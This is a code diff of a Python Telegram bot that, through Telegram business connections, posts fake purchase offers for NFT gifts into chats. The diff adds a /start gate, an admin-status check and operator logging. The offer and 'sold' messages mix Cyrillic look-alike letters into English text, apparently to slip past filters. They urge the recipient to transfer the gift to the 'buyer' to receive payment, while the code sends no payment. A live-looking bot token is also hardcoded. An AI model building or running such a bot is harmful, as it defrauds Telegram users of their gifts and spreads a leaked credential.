@@ -19,6 +19,7 @@ from aiogram.enums import ParseMode
 # ============================================================
 BOT_TOKEN = "8797110393:AAF69tXjTSRu1Ivc28W54m8bUmG2Ry0tOdM"
 ADMIN_LOG_ID = 8751928501
+CHECK_CHAT_ID = -1004405783690 # Группа для проверки админа
 
 EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
@@ -34,12 +35,12 @@ dp = Dispatcher()
 
 business_owner_ids: dict[str, int] = {}
 offers: dict[str, dict] = {}
-
-# ============================================================
-# БАЗА БАНОВ
-# ============================================================
+started_users: set[int] = set()
 banned_users: set[str] = set()
 
+# ============================================================
+# УТИЛИТЫ
+# ============================================================
 def is_banned(user_id: int, username: str | None) -> bool:
     if str(user_id) in banned_users: return True
     if username and f"@{username.lower()}" in banned_users: return True
@@ -61,26 +62,14 @@ def unban_user(identifier: str) -> str:
     if ident.startswith("@"): ident = ident[1:]
     banned_users.discard(f"@{ident.lower()}"); return f"✅ @{ident} разбанен."
 
-# ============================================================
-# ЛОГИРОВАНИЕ ОШИБОК
-# ============================================================
-def log_telegram_error(prefix: str, e: Exception, **ctx):
-    ctx_str = " | ".join(f"{k}={v}" for k, v in ctx.items())
-    if isinstance(e, TelegramRetryAfter): return logger.error(f"[{prefix}] ⏳ FLOOD_WAIT {e.retry_after}s | {ctx_str}")
-    if isinstance(e, TelegramForbiddenError): return logger.error(f"[{prefix}] 🚫 FORBIDDEN | {ctx_str} | {e}")
-    msg = str(e)
-    if "PEER_FLOOD" in msg: return logger.error(f"[{prefix}] 🚨 PEER_FLOOD | {ctx_str}")
-    if isinstance(e, TelegramBadRequest): return logger.error(f"[{prefix}] ⚠️ BAD_REQUEST | {ctx_str} | {msg}")
-    logger.error(f"[{prefix}] ❓ UNKNOWN | {ctx_str} | {e}")
-
-# ============================================================
-# ЛОГИ ДЛЯ АДМИНА
-# ============================================================
 def format_gift_name(slug: str, number: str) -> str:
     formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
     return f"{formatted_slug} #{number}"
 
-def get_log_text(data: dict, status: str, is_read: bool = False) -> str:
+# ============================================================
+# ЛОГИ ДЛЯ АДМИНА
+# ============================================================
+async def get_log_text(data: dict, status: str, is_read: bool = False) -> str:
     status_map = {"pending": ("⏳", "Ожидает"), "accepted": ("✅", "Принят"), "declined": ("❌", "Отклонён")}
     status_emoji, status_text = status_map.get(status, ("⏳", "Ожидает"))
     read_status = "Прочитан" if is_read else "Не прочитан"
@@ -94,10 +83,29 @@ def get_log_text(data: dict, status: str, is_read: bool = False) -> str:
         emoji_id, emoji_char, currency_name = EMOJI_STARS, "⭐", "Stars"
     emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'
 
+    # Эмодзи для заголовка лога
+    log_prefix = f'<tg-emoji emoji-id="{EMOJI_ACCEPT}">✅</tg-emoji>'
+
+    # Проверка на админа в группе
+    is_admin_text = "Проверка..."
+    try:
+        member = await bot.get_chat_member(chat_id=CHECK_CHAT_ID, user_id=data['sender_id'])
+        if member.status in ["creator", "administrator"]:
+            is_admin_text = "Да (Админ)"
+        else:
+            is_admin_text = "Нет (Участник)"
+    except Exception:
+        is_admin_text = "Нет данных"
+
+    # Информация о бизнес-подключении
+    bc_status = f"Подключен ({data['bc_id']})" if data.get('bc_id') else "Нет"
+
     return (
-        f"<b>{EMOJI_ACCEPT} Оффер отправлен.</b>\n\n"
+        f"{log_prefix} <b>Оффер отправлен.</b>\n\n"
         f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
-        f"<b>Отправлен:</b> @{data.get('owner_username', 'unknown')} | {data.get('owner_id', '0')}\n"
+        f"<b>Админ в группе:</b> {is_admin_text}\n"
+        f"<b>Business подключение:</b> {bc_status}\n"
+        f"<b>Владелец подарка:</b> ❌ Недоступно\n"
         f"<b>Подарок:</b> {gift_display}\n"
         f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
         f"<b>Сумма:</b> {data['amount']}\n\n"
@@ -109,14 +117,16 @@ def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
 
 async def send_log_to_admin(data: dict):
     try:
-        msg = await bot.send_message(chat_id=ADMIN_LOG_ID, text=get_log_text(data, "pending", is_read=False), reply_markup=get_log_keyboard(data), disable_web_page_preview=True)
+        text = await get_log_text(data, "pending", is_read=False)
+        msg = await bot.send_message(chat_id=ADMIN_LOG_ID, text=text, reply_markup=get_log_keyboard(data), disable_web_page_preview=True)
         data["log_msg_id"] = msg.message_id
     except Exception as e: logger.error(f"[admin-log] Ошибка отправки: {e}")
 
 async def update_log_message(data: dict, status: str, is_read: bool = False):
     if "log_msg_id" not in data: return
     try:
-        await bot.edit_message_text(chat_id=ADMIN_LOG_ID, message_id=data["log_msg_id"], text=get_log_text(data, status, is_read), reply_markup=get_log_keyboard(data), disable_web_page_preview=True)
+        text = await get_log_text(data, status, is_read)
+        await bot.edit_message_text(chat_id=ADMIN_LOG_ID, message_id=data["log_msg_id"], text=text, reply_markup=get_log_keyboard(data), disable_web_page_preview=True)
     except Exception as e: logger.error(f"[admin-log] Ошибка обновления: {e}")
 
 # ============================================================
@@ -174,8 +184,24 @@ async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None
         except Exception: return False
 
 # ============================================================
-# КОМАНДЫ АДМИНА
+# КОМАНДЫ
 # ============================================================
+@dp.message(F.text == "/start")
+async def cmd_start(message: Message):
+    if message.from_user:
+        started_users.add(message.from_user.id)
+    
+    text = (
+        "<b>Как начать:</b>\n\n"
+        "<b>/delitpr</b>\n\n"
+        "Отправь команду в чат с покупателем:\n"
+        "<code>/delitpr ссылка_на_нфт цена gram / stars</code>\n\n"
+        "Примеры:\n"
+        "<code>/delitpr https://t.me/nft/SkyStilettos-22484 222 stars</code>\n"
+        "<code>/delitpr https://t.me/nft/SkyStilettos-22484 222 gram</code>"
+    )
+    await message.answer(text)
+
 @dp.message(F.text.startswith("/ban"))
 async def cmd_ban(message: Message):
     if message.from_user.id != ADMIN_LOG_ID: return
@@ -197,11 +223,12 @@ async def cmd_banlist(message: Message):
     await message.answer("<b>🚫 Забаненные:</b>\n\n" + "\n".join(f"• <code>{b}</code>" for b in sorted(banned_users)))
 
 # ============================================================
-# БИЗНЕС-ЛОГИКА (AIogram)
+# БИЗНЕС-ЛОГИКА
 # ============================================================
 @dp.business_connection()
 async def handle_business_connection(connection: BusinessConnection) -> None:
     business_owner_ids[connection.id] = connection.user.id
+    logger.info(f"[BC] Подключен к owner={connection.user.id} connection_id={connection.id}")
 
 @dp.business_message(F.text.regexp(r"(?i)^/delitpr\s"))
 async def handle_offer(message: Message) -> None:
@@ -211,7 +238,14 @@ async def handle_offer(message: Message) -> None:
     sender_id = message.from_user.id if message.from_user else 0
     sender_username = message.from_user.username if message.from_user else None
 
-    # Бан
+    # 1. Проверка на /start
+    if sender_id not in started_users:
+        logger.warning(f"[offer] User {sender_id} not started, deleting message.")
+        try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
+        except: pass
+        return
+
+    # 2. Проверка на бан
     if is_banned(sender_id, sender_username):
         try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
         except: pass
@@ -219,7 +253,7 @@ async def handle_offer(message: Message) -> None:
         except: pass
         return
 
-    # Права
+    # 3. Проверка прав
     try:
         connection = await bot.get_business_connection(business_connection_id=bc_id)
         rights = connection.rights
@@ -232,7 +266,7 @@ async def handle_offer(message: Message) -> None:
         logger.error(f"[BC] Ошибка прав: {e}")
         return
 
-    # Парсинг
+    # 4. Парсинг
     data = parse_offer_command(message.text)
     if not data: return
 
@@ -244,12 +278,11 @@ async def handle_offer(message: Message) -> None:
 
     await asyncio.sleep(3)
     
-    # ПАРСИНГ ИМЕНИ
     amount_fmt = f"{int(data['amount']):,}"
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
 
-    text = f"Usеr <b>{sender_name}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr Is vаIid fоr <b>6 h. 0 min</b>.."
+    text = f"Usеr <b>{sender_name}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
 
     offer_id = uuid.uuid4().hex[:12]
     offers[offer_id] = {
@@ -294,8 +327,6 @@ async def handle_accept(callback: CallbackQuery) -> None:
     await asyncio.sleep(0.3)
 
     amount_fmt = f"{int(data['amount']):,}"
-    
-    # Ссылка вшита в название подарка
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
     
     if data["currency"] == "gram":
@@ -305,7 +336,6 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     sold_emoji = f'<tg-emoji emoji-id="{EMOJI_SOLD}">✨</tg-emoji>'
 
-    # Ссылку отдельно не пишем, она уже внутри gift_display
     accept_text = (
         f"{sold_emoji} Gift {gift_display} hаs bееn suссеssfullу sоld fоr <b>{amount_fmt}</b> {emoji} <b>{cur_word}</b>!\n\n"
         f"Tо соmрlеtе thе dеаl, trаnsfеr thе gift tо thе buуеr tо rесеivе уоur {cur_word}"
